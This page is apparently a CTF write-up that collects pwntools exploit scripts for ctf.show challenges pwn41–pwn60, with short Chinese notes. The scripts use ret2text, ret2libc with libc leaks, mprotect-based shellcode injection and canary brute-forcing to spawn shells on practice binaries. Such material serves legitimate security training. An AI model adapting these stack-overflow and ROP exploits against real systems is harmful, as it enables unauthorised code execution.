<h3 id="pwn41（ret2text）"><a href="#pwn41（ret2text）" class="headerlink" title="pwn41（ret2text）"></a>pwn41（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28185)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 4</span><br><span class="line"></span><br><span class="line">sh_addr = 0x80487BA</span><br><span class="line"></span><br><span class="line">system_addr = 0x804856E</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(system_addr) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn42（ret2text）"><a href="#pwn42（ret2text）" class="headerlink" title="pwn42（ret2text）"></a>pwn42（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28132)</span><br><span class="line"></span><br><span class="line">offset = 0xA + 8</span><br><span class="line"></span><br><span class="line">sys_addr = 0x4006B2</span><br><span class="line">sh_addr = 0x400872</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x400843</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn43（ret2text）"><a href="#pwn43（ret2text）" class="headerlink" title="pwn43（ret2text）"></a>pwn43（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28162)</span><br><span class="line">elf = ELF(&#x27;../code/pwn&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">gets_addr = 0x8048420</span><br><span class="line">bss_addr = 0x804B061</span><br><span class="line"></span><br><span class="line">sys_addr = 0x8048450</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn44（ret2text）"><a href="#pwn44（ret2text）" class="headerlink" title="pwn44（ret2text）"></a>pwn44（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28259)</span><br><span class="line"></span><br><span class="line">gets_addr = 0x400530</span><br><span class="line">sys_addr = 0x400520</span><br><span class="line">bss_addr = 0x602081</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x4007f3</span><br><span class="line"></span><br><span class="line">offset = 0xA + 8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(bss_addr) + p64(gets_addr) + p64(pop_rdi) + p64(bss_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn45（ret2libc）"><a href="#pwn45（ret2libc）" class="headerlink" title="pwn45（ret2libc）"></a>pwn45（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197)</span><br><span class="line">elf = ELF(&#x27;../code/pwn&#x27;)</span><br><span class="line">offset = 0x6B + 4</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x10)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;O.o?\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(b&#x27;\xf7&#x27;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr) </span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn46（ret2libc）"><a href="#pwn46（ret2libc）" class="headerlink" title="pwn46（ret2libc）"></a>pwn46（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28218)</span><br><span class="line">elf = ELF(&#x27;../code/pwn&#x27;)</span><br><span class="line">offset = 0x70 + 8</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x400803</span><br><span class="line">pop_rsi_r15 = 0x400801</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;O.o?\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:] + b&#x27;\x00\x00&#x27;)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn47（ret2libc）"><a href="#pwn47（ret2libc）" class="headerlink" title="pwn47（ret2libc）"></a>pwn47（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">offset = 0x9C + 4</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28276)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;puts: &#x27;)</span><br><span class="line">puts_addr = eval(p.recvuntil(&quot;\n&quot;, drop = True))</span><br><span class="line">success(puts_addr)</span><br><span class="line">bin_sh_addr = 0x804b028</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn48（ret2libc）"><a href="#pwn48（ret2libc）" class="headerlink" title="pwn48（ret2libc）"></a>pwn48（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28130)</span><br><span class="line">elf = ELF(&#x27;../code/pwn&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 0x6B + 4</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;O.o?\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[:4])</span><br><span class="line">success(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn49（ret2shellcode-静态编译）"><a href="#pwn49（ret2shellcode-静态编译）" class="headerlink" title="pwn49（ret2shellcode + 静态编译）"></a>pwn49（ret2shellcode + 静态编译）</h3><blockquote>
<p>mprotect函数修改内存权限</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28278)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 4</span><br><span class="line"></span><br><span class="line">mprotect_addr = 0x806CDD0</span><br><span class="line">read_addr = 0x806BEE0</span><br><span class="line">got_addr = 0x80db320 </span><br><span class="line">//这里为什么不能用bss段地址：因为mprotect要求addr必须是内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</span><br><span class="line">pop_eax_edx_ebx = 0x8056194</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(), arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(mprotect_addr) + p32(pop_eax_edx_ebx) + p32(got_addr) + p32(0x1000) + p32(0x7) + p32(read_addr) + p32(got_addr) + p32(0) + p32(got_addr) + p32(len(shellcode))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;    * *************************************                           &#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn50（ret2libc）"><a href="#pwn50（ret2libc）" class="headerlink" title="pwn50（ret2libc）"></a>pwn50（ret2libc）</h3><blockquote>
<p>这题使用LibcSearcher3获取的libc版本错误，使用LibcSearcher则没有这个问题</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28236)</span><br><span class="line">elf = ELF(&#x27;../code/pwn&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x4007e3</span><br><span class="line">ret = 0x4004fe</span><br><span class="line"></span><br><span class="line">offset = 0x20 + 8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Hello CTFshow\n&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:] + b&#x27;\x00\x00&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;puts address --&gt; &#x27;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Hello CTFshow\n&#x27;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn51（ret2text）"><a href="#pwn51（ret2text）" class="headerlink" title="pwn51（ret2text）"></a>pwn51（ret2text）</h3><blockquote>
<p>逆向调试确定一个“I”会替换成“IronMan”，随后栈溢出ret2text即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28174)</span><br><span class="line"></span><br><span class="line">backdoor = 0x804902E</span><br><span class="line"></span><br><span class="line">payload = b&#x27;I&#x27; * (0x6C // 7) + b&#x27;a&#x27; * (0x6c - 0x6C // 7 * 7 + 4) + p32(backdoor)   </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn52（ret2text）"><a href="#pwn52（ret2text）" class="headerlink" title="pwn52（ret2text）"></a>pwn52（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28148)</span><br><span class="line"></span><br><span class="line">flag_addr = 0x8048586</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(flag_addr) + p32(0) + p32(876) + p32(877)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn53（ret2text-canary）"><a href="#pwn53（ret2text-canary）" class="headerlink" title="pwn53（ret2text+canary）"></a>pwn53（ret2text+canary）</h3><blockquote>
<p>本题主要是模拟了canary的实现，由于canary是从文件中读出的，所以推测其可能是一个固定值，因此这里我们可以采用爆破的方法来解决</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">canary = b&#x27;&#x27;</span><br><span class="line">print(type(canary))</span><br><span class="line"></span><br><span class="line">for i in range(4):</span><br><span class="line">    for c in range(0xFF):</span><br><span class="line">        p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28192)</span><br><span class="line">        p.sendlineafter(&#x27;&gt;&#x27;, &#x27;-1&#x27;)</span><br><span class="line">        offset = 0x20 </span><br><span class="line">        payload = b&#x27;a&#x27; * offset + canary + p8(c)</span><br><span class="line">        p.sendafter(&#x27;$ &#x27;, payload)</span><br><span class="line">        # p.recv(1)</span><br><span class="line">        response = p.recv()</span><br><span class="line">        print(response.decode())</span><br><span class="line">        if &#x27;Canary Value Incorrect!&#x27; not in response.decode():</span><br><span class="line">            canary = canary + p8(c)</span><br><span class="line">            break</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">print(&#x27;canary is: &#x27;, canary)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28192)</span><br><span class="line"></span><br><span class="line">flag_addr = 0x8048696</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 0x20 + canary + p32(0) * 4 + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&#x27;, &#x27;-1&#x27;)</span><br><span class="line">p.sendafter(&#x27;$ &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h3><blockquote>
<p>这里我们看到v5刚好在栈中在存储密码的字符串s上面，因此这里我们只需把v5的256字节填充满就可以将密码泄露出来，随后用改密码登录即可</p>
</blockquote>
<h3 id="pwn55（ret2text）"><a href="#pwn55（ret2text）" class="headerlink" title="pwn55（ret2text）"></a>pwn55（ret2text）</h3><blockquote>
<p>这题主要就是涉及32位函数传参</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28103)</span><br><span class="line"></span><br><span class="line">offset = 0x2C + 4</span><br><span class="line"></span><br><span class="line">flag_addr = 0x8048606</span><br><span class="line">flag2_addr = 0x804859D</span><br><span class="line">flag1_addr = 0x8048586</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(flag1_addr) + p32(flag2_addr) + p32(flag_addr) + p32(0xACACACAC) + p32(0xBDBDBDBD)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn56（ret2shellcode）"><a href="#pwn56（ret2shellcode）" class="headerlink" title="pwn56（ret2shellcode）"></a>pwn56（ret2shellcode）</h3><blockquote>
<p>nc即可，主要是帮助理解32位shellcode的编写</p>
</blockquote>
<h3 id="pwn57（ret2shellcode）"><a href="#pwn57（ret2shellcode）" class="headerlink" title="pwn57（ret2shellcode）"></a>pwn57（ret2shellcode）</h3><blockquote>
<p>nc即可，主要是帮助理解64位shellcode的编写</p>
</blockquote>
<h3 id="pwn58（ret2shellcode）"><a href="#pwn58（ret2shellcode）" class="headerlink" title="pwn58（ret2shellcode）"></a>pwn58（ret2shellcode）</h3><blockquote>
<p>简单的ret2shellcode，查看汇编只需要将shellcode写到字符串s上即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28255)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;Attach it!\n&#x27;, shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn59（ret2shellcode）"><a href="#pwn59（ret2shellcode）" class="headerlink" title="pwn59（ret2shellcode）"></a>pwn59（ret2shellcode）</h3><blockquote>
<p>同上</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28286)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;Attach it!\n&#x27;, shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn60（ret2shellcode）"><a href="#pwn60（ret2shellcode）" class="headerlink" title="pwn60（ret2shellcode）"></a>pwn60（ret2shellcode）</h3><blockquote>
<p>这里IDA中的偏移有点问题，还是需要自己去GDB中调试一下</p>
</blockquote>
